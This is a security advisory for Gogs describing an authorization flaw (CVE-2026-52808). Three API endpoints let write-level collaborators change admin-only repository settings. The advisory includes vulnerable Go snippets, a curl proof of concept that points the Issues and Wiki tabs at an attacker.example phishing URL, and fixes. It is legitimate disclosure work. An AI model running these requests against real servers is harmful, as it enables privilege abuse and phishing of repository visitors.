# [H] Gogs's write-level collaborators can mutate admin-only repository settings via API

## Summary
Severity: High
Advisory: GHSA-268j-37xf-pp52
CVE: CVE-2026-52808
CWE: CWE-269, CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-06-23
Source: https://github.com/advisories/GHSA-268j-37xf-pp52
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.14.3

## Details
## Summary

Three API endpoints — `PATCH /api/v1/repos/:owner/:repo/issue-tracker`, `PATCH /api/v1/repos/:owner/:repo/wiki`, and `POST /api/v1/repos/:owner/:repo/mirror-sync` — are gated by `reqRepoWriter()` rather than `reqRepoAdmin()`. The equivalent operations in the web UI sit behind `reqRepoAdmin`, which requires `AccessMode >= AccessModeAdmin`. A write-level collaborator (who has `AccessMode == AccessModeWrite < AccessModeAdmin`) can therefore call these API endpoints directly to disable the native issue tracker or wiki, inject attacker-controlled external tracker/wiki URLs that redirect all repository visitors, or trigger mirror sync — none of which they are authorized to do.

## Severity

**High** (CVSS 3.1: 7.1)

`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L`

- **Attack Vector:** Network — the API endpoints are reachable over HTTP/S.
- **Attack Complexity:** Low — a single API call is sufficient; no chaining or race condition required.
- **Privileges Required:** Low — only write-level collaborator access to the targeted repository is needed. The attacker does not need repo-admin or site-admin privileges.
- **User Interaction:** None — the attacker acts unilaterally.
- **Scope:** Unchanged — the impact is contained to the targeted repository's settings and its visitors.
- **Confidentiality Impact:** None — the attacker does not read confidential data directly.
- **Integrity Impact:** High — the attacker permanently mutates repository configuration, including injecting an external URL that redirects all visitors who click the Issues or Wiki tabs to an attacker-controlled site.
- **Availability Impact:** Low — disabling the native issue tracker or wiki reduces the availability of those features for all repository participants.


## Affected component

- `internal/route/api/v1/api.go` — route registration (lines 365–367)
- `internal/route/api/v1/repo_repo.go` — `issueTracker()` (line 400), `wiki()` (line 437), `mirrorSync()` (line 463)

## CWE

- **CWE-863**: Incorrect Authorization
- **CWE-269**: Improper Privilege Management

## Description

### Three admin-equivalent API endpoints are protected by write-level middleware

`api.go:365-367` registers the three settings endpoints with `reqRepoWriter()`:

```go
// internal/route/api/v1/api.go:365-367
m.Patch("/issue-tracker", reqRepoWriter(), bind(editIssueTrackerRequest{}), issueTracker)
m.Patch("/wiki", reqRepoWriter(), bind(editWikiRequest{}), wiki)
m.Post("/mirror-sync", reqRepoWriter(), mirrorSync)
```

`reqRepoWriter()` (defined at `api.go:131-138`) passes any user whose repository `AccessMode >= AccessModeWrite`:

```go
func reqRepoWriter() macaron.Handler {
    return func(c *context.Context) {
        if !c.Repo.IsWriter() {
            c.Status(http.StatusForbidden)
            return
        }
    }
}
```

The handlers themselves perform no additional privilege check before mutating state:

```go
// internal/route/api/v1/repo_repo.go:400-428
func issueTracker(c *context.APIContext, form editIssueTrackerRequest) {
    _, repo := parseOwnerAndRepo(c)
    ...
    if form.EnableExternalTracker != nil {
        repo.EnableExternalTracker = *form.EnableExternalTracker
    }
    if form.ExternalTrackerURL != nil {
        repo.ExternalTrackerURL = *form.ExternalTrackerURL   // ← attacker-controlled URL written directly
    }
    ...
    database.UpdateRepository(repo, false)   // ← no admin check before this call
}
```

The `wiki()` handler (lines 437–461) follows the same pattern, writing `repo.ExternalWikiURL` directly and calling `UpdateRepository` with no admin gate.

### The web UI imposes a stricter admin requirement for the same operations

`cmd/gogs/web.go:472` wraps the entire `/settings` subtree with `reqRepoAdmin`:

```go
// cmd/gogs/web.go:425-472
m.Group("/:username/:reponame", func() {
    m.Group("/settings", func() {
        m.Combo("").Get(repo.Settings).
            Post(bindIgnErr(form.RepoSetting{}), repo.SettingsPost)
        ...
    }, ...)
}, reqSignIn, context.RepoAssignment(), reqRepoAdmin, context.RepoRef())
```

`context.RequireRepoAdmin()` (defined at `context/repo.go:434-441`) requires `AccessMode >= AccessModeAdmin`:

```go
func RequireRepoAdmin() macaron.Handler {
    return func(c *Context) {
        if !c.IsLogged || (!c.Repo.IsAdmin() && !c.User.IsAdmin) {
            c.NotFound()
            return
        }
    }
}
```

In the access mode hierarchy, `AccessModeWrite < AccessModeAdmin`. A write-level collaborator satisfies `reqRepoWriter()` but does not satisfy `RequireRepoAdmin()`. The API path provides the write-level collaborator with capabilities that the UI correctly withholds.

### Full execution chain

1. **Attacker precondition**: Attacker is added as a repository collaborator with write access (`AccessMode == AccessModeWrite`).
2. **API call**: `PATCH /api/v1/repos/OWNER/REPO/issue-tracker` with `Authorization: token WRITER_TOKEN` and body `{"enable_external_tracker":true,"external_tracker_url":"https://attacker.example/phish"}`.
3. **Middleware**: `reqRepoWriter()` checks `c.Repo.IsWriter()` → `AccessMode >= AccessModeWrite` → passes.
4. **Handler**: `issueTracker()` sets `repo.EnableExternalTracker = true` and `repo.ExternalTrackerURL = "https://attacker.example/phish"`, then calls `database.UpdateRepository(repo, false)`. No admin check occurs.
5. **Impact**: All visitors to the repository who click the "Issues" tab are redirected to the attacker's server. The native issue tracker is bypassed permanently until a repo admin reverses the change.

## Proof of Concept

```bash
# Precondition: attacker is a collaborator with WRITE access, not repo admin.

# 1) Redirect the Issues tab to an attacker-controlled phishing page
curl -i -X PATCH "https://TARGET/api/v1/repos/OWNER/REPO/issue-tracker" \
  -H "Authorization: token WRITER_TOKEN" \
  -H "Content-Type: application/json" \
  --data '{"enable_issues":false,"enable_external_tracker":true,"external_tracker_url":"https://attacker.example/phish"}'
# Expected: HTTP 204 No Content

# 2) Redirect the Wiki tab to an attacker-controlled page
curl -i -X PATCH "https://TARGET/api/v1/repos/OWNER/REPO/wiki" \
  -H "Authorization: token WRITER_TOKEN" \
  -H "Content-Type: application/json" \
  --data '{"enable_wiki":false,"enable_external_wiki":true,"external_wiki_url":"https://attacker.example/phish-wiki"}'
# Expected: HTTP 204 No Content

# 3) Force a mirror sync on a mirrored repository (potential resource abuse)
curl -i -X POST "https://TARGET/api/v1/repos/OWNER/REPO/mirror-sync" \
  -H "Authorization: token WRITER_TOKEN"
# Expected: HTTP 202 Accepted
```

## Impact

- A write-level collaborator can permanently replace the native issue tracker with an external URL under attacker control, redirecting all repository visitors who follow the Issues link to a phishing or malware-serving page.
- The same redirect attack applies to the Wiki tab via the external wiki URL setting.
- Both redirects remain active until a repo admin or owner manually reverses the setting; the attacker has no way to be removed from having already made the change.
- Mirror sync can be triggered repeatedly, potentially causing unnecessary load on the upstream mirror source or consuming network resources.
- All three operations are silent — no notification is sent to repo admins when these settings change via the API.

## Recommended remediation

### Option 1: Change middleware to `reqRepoAdmin()` on all three endpoints (preferred)

Replace `reqRepoWriter()` with `reqRepoAdmin()` at the route registration level. This is a one-line change per endpoint and aligns the API authorization with the web UI's established policy.

```go
// internal/route/api/v1/api.go:365-367
m.Patch("/issue-tracker", reqRepoAdmin(), bind(editIssueTrackerRequest{}), issueTracker)
m.Patch("/wiki", reqRepoAdmin(), bind(editWikiRequest{}), wiki)
m.Post("/mirror-sync", reqRepoAdmin(), mirrorSync)
```

### Option 2: Add an explicit admin check inside the handlers

Add `c.Repo.IsAdmin()` checks at the top of `issueTracker()`, `wiki()`, and `mirrorSync()`. This is less preferred because it duplicates middleware logic in handler code, but it provides defense-in-depth if the route middleware is ever accidentally changed.

```go
func issueTracker(c *context.APIContext, form editIssueTrackerRequest) {
    if !c.Repo.IsAdmin() {
        c.Status(http.StatusForbidden)
        return
    }
    ...
}
```

## Credit

This vulnerability was discovered and reported by [bugbunny.ai](https://bugbunny.ai).

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-268j-37xf-pp52
- https://nvd.nist.gov/vuln/detail/CVE-2026-52808
- https://github.com/gogs/gogs/pull/8327
- https://github.com/gogs/gogs/commit/6283462119bd8894f1599d70339b5e823f99954a
- https://github.com/gogs/gogs
- https://github.com/gogs/gogs/releases/tag/v0.14.3
